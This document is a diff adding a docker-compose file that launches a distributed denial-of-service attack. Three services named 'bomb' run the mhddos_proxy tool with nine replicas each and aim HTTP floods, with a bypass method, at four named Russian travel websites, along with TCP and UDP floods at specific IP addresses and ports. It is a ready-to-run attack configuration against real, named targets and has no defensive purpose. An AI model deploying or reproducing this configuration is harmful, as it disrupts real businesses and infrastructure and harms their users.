@@ -1,0 +1,31 @@
+version: '3'
+
+services:
+
+  bomb01:
+    image: ghcr.io/porthole-ascend-cinnamon/mhddos_proxy
+    command:  https://anex-tour.ru/ https://www.1001tur.ru/ https://tours.tutu.ru/ https://travelata.ru/ -t 1000 -p 300 --rpc 100 --http-methods bypass --debug
+    deploy:
+      replicas: 9
+
+  bomb02:
+    image: ghcr.io/porthole-ascend-cinnamon/mhddos_proxy
+    command: tcp://95.214.60.149:21  tcp://95.214.60.149:22  tcp://95.214.60.149:80  tcp://95.214.60.149:443  tcp://89.208.35.174:22  tcp://89.208.35.174:80  tcp://89.208.35.174:443  tcp://178.248.236.15:80  tcp://178.248.236.15:443  tcp://178.248.232.202:80  tcp://178.248.232.202:443 -t 1000 -p 300 --rpc 100 --http-methods TCP --debug
+    deploy:
+      replicas: 9
+
+  bomb03:
+    image: ghcr.io/porthole-ascend-cinnamon/mhddos_proxy
+    command:  udp://89.208.35.174:53 udp://89.208.35.174:123 udp://89.208.35.174:500 -t 1000 -p 300 --rpc 100 --http-methods UDP --debug
+    deploy:
+      replicas: 9
+
+    
+
+
+
+
+
+
+
+
